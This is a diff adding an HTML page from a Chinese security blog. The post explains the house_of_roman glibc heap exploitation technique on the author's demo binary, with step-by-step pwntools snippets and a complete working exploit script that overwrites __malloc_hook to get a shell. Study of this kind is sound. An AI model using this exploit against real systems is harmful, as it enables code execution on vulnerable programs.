@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,houseofxxx,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="记录一下，防止以后忘了 house_of_roman：该技术用于 bypass ALSR，利用12-bit 的爆破来达到获取shell的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用 house_of_roman的作者提供了一个demo作为展示利用大概分三个步骤：  将 FD 指向 malloc_hook 修正 0x71 的 Freelist 往 mal">
+<meta name="keywords" content="pwn,houseofxxx">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house_of_roman">
+<meta property="og:url" content="http://yoursite.com/2018/09/18/2018-9-18-house_of_roman/index.html">
+<meta property="og:site_name" content="zs0zrc">
+<meta property="og:description" content="记录一下，防止以后忘了 house_of_roman：该技术用于 bypass ALSR，利用12-bit 的爆破来达到获取shell的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用 house_of_roman的作者提供了一个demo作为展示利用大概分三个步骤：  将 FD 指向 malloc_hook 修正 0x71 的 Freelist 往 mal">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-5f41ba436f00b362.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-90ee8d5e08b8dae0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-79305495e088297f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-5a10855ae6b7c4b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-8e4a6ab58e9378e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-7fc648262fe2846a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-11881a8dedc6e3f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-4c517ec5e4f5124c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-ee409842db40e908.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-d2163ba454fc6077.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-761998a41cbe7cb4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-abd47dd3a2c014ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-5f1bc9592229eadb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-20c2331aae3ca172.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-c35b6a4c23a57941.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-01-02T08:20:41.200Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="house_of_roman">
+<meta name="twitter:description" content="记录一下，防止以后忘了 house_of_roman：该技术用于 bypass ALSR，利用12-bit 的爆破来达到获取shell的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用 house_of_roman的作者提供了一个demo作为展示利用大概分三个步骤：  将 FD 指向 malloc_hook 修正 0x71 的 Freelist 往 mal">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/8390991-5f41ba436f00b362.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/18/2018-9-18-house_of_roman/">
+
+
+
+
+
+  <title>house_of_roman | zs0zrc</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zs0zrc</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/18/2018-9-18-house_of_roman/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zs0zrc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zs0zrc">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">house_of_roman</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-18T00:00:00+08:00">
+                2018-09-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Heap-Exploitation/" itemprop="url" rel="index">
+                    <span itemprop="name">Heap_Exploitation</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/09/18/2018-9-18-house_of_roman/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/09/18/2018-9-18-house_of_roman/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>记录一下，防止以后忘了</p>
+<p>house_of_roman：<br>该技术用于 bypass ALSR，利用12-bit 的爆破来达到获取shell的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用</p>
+<p>house_of_roman的作者提供了一个<a href="https://github.com/romanking98/House-Of-Roman" target="_blank" rel="noopener">demo</a>作为展示<br>利用大概分三个步骤：</p>
+<ol>
+<li>将 FD 指向 malloc_hook</li>
+<li>修正 0x71 的 Freelist</li>
+<li>往 malloc_hook 写入 one gadget</li>
+</ol>
+<p>先分析下程序：<br>程序开启了PIE和NX，一共有3个功能</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-5f41ba436f00b362.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>程序存在UAF漏洞和堆溢出漏洞</p>
+<p>堆溢出：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-90ee8d5e08b8dae0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>UAF：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-79305495e088297f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>程序的大致情况了解了后，分析作者的利用过程<br>我将作者的利用过程又细分了下</p>
+<ol>
+<li>先分配3个chunk(0,1,2),大小分别为0x20,0xd0,0x70</li>
+<li>用write_chunk功能在chunk2 + 0x68上设置fakesize 为0x61，用于后面的fastbins attack</li>
+<li>将chunk1 free 掉后再分配，使得chunk1中包含main_arean+0x88的指针</li>
+<li>然后分配3个大小为0x70的chunk(3,4,5),为后面做准备</li>
+<li>通过堆溢出漏洞，将chunk1的size字段伪造为0x71，然后将chunk2,chunk3 free掉，通过UAF漏洞，将chunk3的fd指针最低位修改成0x20，将chunk1加入fastbins list中</li>
+<li>将chunk1的fd修改成 <strong>malloc_hook-0x23,之所以修改成</strong>malloc_hook-0x23 ，是为了后面的fastbin dup， __malloc_hook - 0x23 + 0x8的地址上的值为0x7f</li>
+<li>连续分配3个大小为0x70的chunk，就可以获得包含__malloc_hook的chunk，将这个chunk指针赋给chunk0</li>
+<li>free掉chunk4,通过uaf，将chunk4的FD修改为0，修复fastbins list</li>
+<li>利用unsorted bins attack 向__malloc_hook写入main_arena+0x88<ol start="10">
+<li>通过编辑功能，将__malloc_hook的低三个字节修改成one_gadget的偏移</li>
+</ol>
+</li>
+<li>最后连续free chunk5两次，通过malloc_printerr来出发malloc，getshell</li>
+</ol>
+<hr>
+<p>为了方便调试，我关掉了aslr</p>
+<ul>
+<li>设置fake_size<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake = <span class="string">"A"</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)  <span class="comment">## fake size</span></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-5a10855ae6b7c4b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<ul>
+<li>free chunk1，使其包含main_arena+0x88的地址</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-8e4a6ab58e9378e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>*分配3个大小为0x70的chunk,修改chunk1的size字段为0x71<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x65</span>,<span class="number">3</span>)  <span class="comment"># chunk3 0x555555757170</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">15</span>) <span class="comment"># chunk4 0x5555557571e0</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">18</span>) <span class="comment"># chunk5 0x555555757250</span></span><br><span class="line"></span><br><span class="line">over = <span class="string">"A"</span>*<span class="number">0x18</span>  <span class="comment"># off by one</span></span><br><span class="line">over += <span class="string">"\x71"</span>  <span class="comment"># set chunk  1's size --&gt; 0x71</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-7fc648262fe2846a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<ul>
+<li>free掉chunk2，chunk3，通过uaf将chunk3的fd最低为修改为’\x20’，将chunk1加入fastbins list中<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">heap_po = <span class="string">"\x20"</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-11881a8dedc6e3f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<ul>
+<li>利用write功能，将chunk1的fd指针最低两位修改成’\xed\x1a’,即将fd修改为<strong>malloc_hook - 0x23，这是为了利用fastbins dup 获得包含</strong>malloc_hook的chunk， 原因上面说了，因为__malloc_hook - 0x23 +0x8地址的值为0x7f，可以绕过检测<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook_nearly = <span class="string">"\xed\x1a"</span> <span class="comment">#__malloc_hook - 0x23 </span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-4c517ec5e4f5124c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<ul>
+<li>连续分配三次大小为0x70的chunk，就可以获得包含__malloc_hook的chunk了</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-ee409842db40e908.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-d2163ba454fc6077.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<ul>
+<li>利用 unsorted bin attack 向<strong>malloc_hook中写入main_arena+0x88，使</strong>malloc_hook中包含libc的地址<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">po = <span class="string">"B"</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">"\x00\x1b"</span> <span class="comment"># 这个是__memalign_hook的最低两位，为了将bk修改为__malloc_hook - 0x10</span></span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-761998a41cbe7cb4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<ul>
+<li>通过修改chunk0，将__malloc_hook的低三位修改为one_gadget<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">over = &quot;R&quot;*0x13   # padding for malloc_hook</span><br><span class="line">over += &quot;\xa4\xd2\xaf&quot;</span><br><span class="line">edit(0,over)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>此时 <strong>malloc_hook附近的内容为下图，padding的计算是分配包含</strong>malloc_hook的chunk的地址 减去 __malloc_hook的地址</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-abd47dd3a2c014ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-5f1bc9592229eadb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-20c2331aae3ca172.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<ul>
+<li>最后通过连续free同一块chunk，通过malloc_printerr 来触发malloc getshell</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-c35b6a4c23a57941.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./new_chall'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,idx)</span>:</span></span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(<span class="string">"zs0zrc"</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) <span class="comment"># chunk0 0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># chunk1 d0 0x555555757030	</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">2</span>) <span class="comment"># chunk2 0x70 0x555555757100</span></span><br><span class="line"></span><br><span class="line">fake = <span class="string">"A"</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)  <span class="comment">## fake size</span></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line">log.info(<span class="string">'edit chunk 1 to fake'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">3</span>)  <span class="comment"># chunk3 0x555555757170</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">15</span>) <span class="comment"># chunk4 0x5555557571e0</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">18</span>) <span class="comment"># chunk5 0x555555757250</span></span><br><span class="line"></span><br><span class="line">over = <span class="string">"A"</span>*<span class="number">0x18</span>  <span class="comment"># off by one</span></span><br><span class="line">over += <span class="string">"\x71"</span>  <span class="comment"># set chunk  1's size --&gt; 0x71</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">log.info(<span class="string">'set chunk  1 size --&gt; 0x71'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">heap_po = <span class="string">"\x20"</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line">log.info(<span class="string">'ADD b to fastbins list'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc_hook--&gt;[0x7ffff7dd1b10]</span></span><br><span class="line">malloc_hook_nearly = <span class="string">"\xed\x1a"</span> <span class="comment">#__malloc_hook - 0x23 </span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line">log.info(<span class="string">"change B fd "</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">0</span>) <span class="comment">#malloc a chunk include malloc_hook</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0</span>))<span class="comment">#fix fastbins list</span></span><br><span class="line">log.info(<span class="string">'fix fastbins list'</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">po = <span class="string">"B"</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">"\x00\x1b"</span></span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">'use unsortbins attack change malloc_hook to main_arena + 0x88'</span>)</span><br><span class="line"></span><br><span class="line">over = <span class="string">"R"</span>*<span class="number">0x13</span>   <span class="comment"># padding for malloc_hook</span></span><br><span class="line">over += <span class="string">"\xa4\xd2\xaf"</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/houseofxxx/" rel="tag"># houseofxxx</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/17/2018-9-17-IO_FILE的一些利用总结/" rel="next" title="IO_FILE的利用总结">
+                <i class="fa fa-chevron-left"></i> IO_FILE的利用总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/19/2018-9-19-house_of_orange/" rel="prev" title="house_of_orange">
+                house_of_orange <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
+            
+              <p class="site-author-name" itemprop="name">zs0zrc</p>
+              <p class="site-description motion-element" itemprop="description">zs0zrc's blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
